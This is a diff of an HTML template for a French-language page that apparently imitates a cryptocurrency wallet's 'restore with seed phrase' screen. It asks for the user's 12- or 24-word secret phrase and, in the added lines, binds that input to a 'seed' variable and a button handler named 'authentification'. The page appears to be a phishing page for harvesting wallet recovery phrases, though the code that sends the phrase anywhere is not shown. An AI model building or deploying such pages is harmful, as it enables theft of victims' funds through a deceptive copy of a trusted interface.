@@ -2,26 +2,26 @@
   {{ template "head" .PageTitle }}
   <body>
   <div id="app-content" class="dark">
-  {{ template "header" .PageTitle }}
-
-  <div class="app mouse-user-styles">
-    <div class="main-container-wrapper">
-      <div class="first-view-main-wrapper">
-        <div class="first-view-main">
-          <div class="import-account">
-            <a class="import-account__back-button" href="#">&lt; Back</a>
-            <div class="import-account__title">Restaurer votre compte avec une phrase Seed.</div>
-            <div class="import-account__selector-label">Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</div>
-            <div class="import-account__input-wrapper">
-              <label class="import-account__input-label">Wallet Seed</label><textarea class="import-account__secret-phrase" placeholder="Separez chaque mot avec un espace simple"></textarea>
+    <div class="app mouse-user-styles">
+      <div class="main-container-wrapper">
+        <div class="first-time-flow">
+          <div class="first-time-flow__wrapper">
+            <div class="import-account" id="div-restaurer">
+              <a class="import-account__back-button" href="/">&lt; Back</a>
+              <div class="import-account__title">Restaurer votre compte avec une phrase Seed.</div>
+              <div class="import-account__selector-label">Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</div>
+              <div class="import-account__input-wrapper">
+                <label class="import-account__input-label">Wallet Seed</label>
+                <textarea class="import-account__secret-phrase" v-model="seed" placeholder="Separez chaque mot avec un espace simple"></textarea>
+                <p v-model="answer"></p>
+              </div>
+              <button class="button btn--first-time first-time-flow__button" v-on:click="authentification" id="btn-restaurer">Restaurer</button>
             </div>
-            <button class="button btn--first-time first-time-flow__button" >Restaurer</button>
           </div>
         </div>
       </div>
     </div>
-  </div>
-  {{ template "footer" }}
+    {{ template "footer" }}
   </div>
 </body>
 </html>{{ end }}
